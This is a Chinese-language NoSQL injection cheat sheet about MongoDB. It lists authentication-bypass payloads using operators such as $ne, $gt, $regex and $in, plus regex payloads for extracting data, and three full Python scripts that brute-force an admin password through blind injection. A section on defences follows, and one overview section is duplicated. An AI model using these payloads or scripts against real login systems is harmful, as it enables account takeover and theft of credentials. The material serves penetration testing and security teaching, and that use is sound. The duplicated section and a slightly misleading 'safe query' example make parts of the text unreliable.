# NoSQL 注入

> NoSQL 数据库比传统 SQL 数据库提供更宽松的一致性限制。通过减少关系约束和一致性检查，NoSQL 数据库通常能提供更好的性能和扩展性。然而，即使不使用传统的 SQL 语法，这些数据库仍然可能受到注入攻击。

## NoSQL 注入原理

NoSQL 注入是一种安全漏洞，攻击者通过操纵应用程序与 NoSQL 数据库之间的查询来执行非预期的操作。与传统的 SQL 注入不同，NoSQL 注入利用了 NoSQL 数据库的查询语法和结构。

### 常见 NoSQL 数据库类型

1. **文档型数据库**
   - MongoDB
   - CouchDB
   - Couchbase

2. **键值存储**
   - Redis
   - DynamoDB
   - Riak

3. **宽列存储**
   - Cassandra
   - HBase

4. **图数据库**
   - Neo4j
   - ArangoDB

### 注入点

1. **查询参数**
   - URL 参数
   - 请求体参数
   - HTTP 头

2. **API 端点**
   - RESTful API
   - GraphQL 查询
   - SOAP 请求

3. **ORM/ODM 查询**
   - Mongoose 查询
   - Spring Data 查询
   - 其他 ORM/ODM 工具

## 目录

* [工具](#工具)
* [方法学](#方法学)
    * [操作符注入](#操作符注入)
    * [认证绕过](#认证绕过)
    * [提取长度信息](#提取长度信息)
    * [提取数据信息](#提取数据信息)
    * [WAF 和过滤器](#waf-和过滤器)
* [盲注 NoSQL](#盲注-nosql)
    * [带 JSON 请求体的 POST 请求](#带-json-请求体的-post-请求)
    * [带 urlencoded 请求体的 POST 请求](#带-urlencoded-请求体的-post-请求)
    * [GET 请求](#get-请求)
* [实验](#实验)
* [防御措施](#防御措施)
* [参考资料](#参考资料)

## 工具

* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - 自动化的 NoSQL 数据库枚举和 Web 应用利用工具
* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - 用于练习 NoSQL 注入的实验环境
* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - 用于发现 NoSQL 注入漏洞的 Burp Suite 扩展

## 方法学

NoSQL 注入发生在攻击者通过向 NoSQL 数据库查询中注入恶意输入来操纵查询时。与 SQL 注入不同，NoSQL 注入通常利用基于 JSON 的查询和操作符，如 MongoDB 中的 `$ne`、`$gt`、`$regex` 或 `$where`。

### 操作符注入

| 操作符 | 描述         |
| ------ | ------------ |
| $ne    | 不等于       |
| $regex | 正则表达式   |
| $gt    | 大于         |
| $lt    | 小于         |
| $nin   | 不在列表中   |


示例：一个 Web 应用有一个产品搜索功能

```js
db.products.find({ "price": userInput })
```

攻击者可以注入 NoSQL 查询：`{ "$gt": 0 }`

```js
db.products.find({ "price": { "$gt": 0 } })
```

数据库不会返回特定产品，而是返回所有价格大于零的产品，导致数据泄露。

### 认证绕过

使用不等于 (`$ne`) 或大于 (`$gt`) 进行基本的认证绕过

* HTTP 数据

  ```
  username[$ne]=toto&password[$ne]=toto
  login[$regex]=a.*&pass[$ne]=lol
  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
  ```

* JSON 数据

  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
  {"username": {"$gt":""}, "password": {"$gt":""}}
  ```

### 提取长度信息

使用 `$regex` 操作符注入有效载荷。当长度正确时，注入将起作用。

```
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### 提取数据信息

使用 `$regex` 查询操作符提取数据。

* HTTP 数据

  ```
  username[$ne]=toto&password[$regex]=m.{2}
  username[$ne]=toto&password[$regex]=md.{1}
  username[$ne]=toto&password[$regex]=mdp

  username[$ne]=toto&password[$regex]=m.*
  username[$ne]=toto&password[$regex]=md.*
  ```

* JSON 数据

  ```json
  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
  ```

使用 `$in` 查询操作符提取数据。

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### WAF 和过滤器

**移除前置条件**：

在 MongoDB 中，如果一个文档包含重复的键，只有最后一个键值对会生效。

```js
{"id":"10", "id":"100"} 
```

在这个例子中，"id" 的最终值将是 "100"。

## 盲注 NoSQL

### 带 JSON 请求体的 POST 请求

Python 脚本：

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("发现新字符: %s" % (password+c))
                password += c
```

### 带 urlencoded 请求体的 POST 请求

Python 脚本：

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("发现新字符: %s" % (password+c))
                password += c
```

### GET 请求

Python 脚本：

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|', '#', '&', '$']:
            payload=f"?username={username}&password[$regex]=^{password + c}"
            r = requests.get(u + payload)
            if 'Yeah' in r.text:
                print("发现新字符: %s" % (password+c))
                password += c
                break
```

## 实验

* [NoSQL 注入实验室](https://github.com/digininja/nosqlilab)
* [WebGoat NoSQL 注入挑战](https://github.com/WebGoat/WebGoat)
* [MongoDB 安全实验室](https://github.com/OWASP/NodeGoat)

## 参考资料

* [OWASP NoSQL 注入防护指南](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#nosql-injection)
* [MongoDB 安全文档](https://docs.mongodb.com/manual/security/)
* [NoSQL 注入白皮书](https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf)
* [NoSQL 注入速查表](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

## NoSQL 注入原理

### 基本概念

NoSQL 注入是一种安全漏洞，攻击者通过操纵应用程序与 NoSQL 数据库之间的查询来执行非预期的操作。与传统的 SQL 注入不同，NoSQL 注入利用了 NoSQL 数据库的查询语法和结构。

### 常见 NoSQL 数据库类型

1. **文档型数据库**
   - MongoDB
   - CouchDB
   - Couchbase

2. **键值存储**
   - Redis
   - DynamoDB
   - Riak

3. **宽列存储**
   - Cassandra
   - HBase

4. **图数据库**
   - Neo4j
   - ArangoDB

### 注入点

1. **查询参数**
   - URL 参数
   - 请求体参数
   - HTTP 头

2. **API 端点**
   - RESTful API
   - GraphQL 查询
   - SOAP 请求

3. **ORM/ODM 查询**
   - Mongoose 查询
   - Spring Data 查询
   - 其他 ORM/ODM 工具

### 攻击技术

1. **操作符注入**
   - 使用 `$ne`、`$gt`、`$lt` 等操作符
   - 绕过认证和授权检查
   - 提取敏感数据

2. **JavaScript 注入**
   - 在支持 JavaScript 的数据库中执行任意代码
   - 例如 MongoDB 的 `$where` 操作符

3. **正则表达式注入**
   - 使用 `$regex` 操作符进行盲注
   - 提取密码哈希或其他敏感信息

4. **类型混淆**
   - 利用弱类型或动态类型
   - 绕过输入验证

## 防御措施

### 输入验证

1. **白名单验证**
   ```javascript
   // 验证用户名只包含字母和数字
   function isValidUsername(username) {
       return /^[a-zA-Z0-9]+$/.test(username);
   }
   ```

2. **类型检查**
   ```javascript
   // 确保输入是字符串类型
   if (typeof username !== 'string') {
       throw new Error('Invalid input type');
   }
   ```

### 参数化查询

1. **使用 ORM/ODM 的安全方法**
   ```javascript
   // 不安全的查询
   User.find({ username: req.body.username });
   
   // 安全查询 - 使用参数化
   User.findOne({ username: { $eq: req.body.username } });
   ```

2. **使用安全 API**
   - 使用 Mongoose 的内置方法
   - 避免使用 `$where` 和 `mapReduce`

### 最小权限原则

1. **数据库用户权限**
   - 为应用创建专用数据库用户
   - 只授予必要的最低权限
   - 限制网络访问

2. **角色基础访问控制**
   ```javascript
   // 定义角色和权限
   const roles = {
       user: ['read:own_profile'],
       admin: ['read:any_profile', 'delete:any_profile']
   };
   ```

### 安全配置

1. **禁用危险特性**
   - 在生产环境中禁用 JavaScript 执行
   - 关闭管理接口
   - 启用认证

2. **MongoDB 安全配置**
   ```yaml
   # mongod.conf
   security:
     authorization: enabled
   setParameter:
     enableLocalhostAuthBypass: false
   ```

### 监控与日志

1. **审计日志**
   - 记录所有数据库操作
   - 监控异常查询模式
   - 设置告警

2. **入侵检测**
   - 使用 WAF 检测 NoSQL 注入尝试
   - 实现速率限制
   - 监控异常请求

### 安全开发实践

1. **使用最新版本**
   - 定期更新 NoSQL 数据库
   - 应用安全补丁

2. **安全代码审查**
   - 检查所有数据库查询
   - 测试边界条件
   - 进行渗透测试

3. **安全编码指南**
   - 避免拼接查询
   - 使用参数化查询
   - 实现适当的错误处理
